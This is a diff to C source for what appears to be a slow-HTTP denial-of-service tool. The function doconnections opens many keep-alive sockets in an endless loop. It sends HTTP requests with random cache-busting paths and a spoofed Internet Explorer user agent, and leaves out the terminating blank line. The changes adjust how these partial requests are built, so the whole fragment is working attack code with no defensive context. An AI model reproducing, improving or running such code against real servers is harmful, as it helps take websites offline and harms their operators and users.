@@ -160,7 +160,7 @@ void doconnections( int num)
     int written;
     socks = malloc( sizeof(*socks) * num );
     int random;
-    int len;
+    //int len;
     const int flag = 1; //True for SO_KEEPALIVE
 
     while( 1 )
@@ -204,23 +204,27 @@ void doconnections( int num)
                         if( cache )
                         {
                             random = rand();
-                            snprintf(  buf, 1024,"%s/%d HTTP/1.1\r\n"
+                            snprintf(  buf, 1024,"%s /%d HTTP/1.1\r\n"
                                                      "Host: %s\r\n"
                                                      "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
                                                      "Connection: Keep-Alive\r\n"
-                                                     "Content-Length: ", method, random, sendhost);
-                            len = strlen( buf ) + 3;
-                            snprintf( sendbuf, 1024, "%s%d\r\n", buf, len );
+                                                    // "Content-Length: "
+                                                     , method, random, sendhost);
+                            //len = strlen( buf ) + 3;
+                            //snprintf( sendbuf, 1024, "%s%d\r\n", buf, len );
+                            strcpy(sendbuf, buf);
 
                         }
                         else
                         {
-                            snprintf(  buf, 1024,"%s/ HTTP/1.1\r\n"
+                            snprintf(  buf, 1024,"%s / HTTP/1.1\r\n"
                                                      "Host: %s\r\n"
                                                      "User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\r\n"
-                                                     "Content-Length: 42\r\n", method, sendhost);
-                            len = strlen( buf )+3;
-                            snprintf( sendbuf, 1024, "%s%d\r\n", buf, len );
+                                                     "Connection: Keep-Alive\r\n"
+                                                     , method, sendhost);
+                            //len = strlen( buf )+3;
+                            //snprintf( sendbuf, 1024, "%s%d\r\n", buf, len );
+                            strcpy(sendbuf, buf);
                         }
                         written = strlen(sendbuf);
 #ifndef WIN32
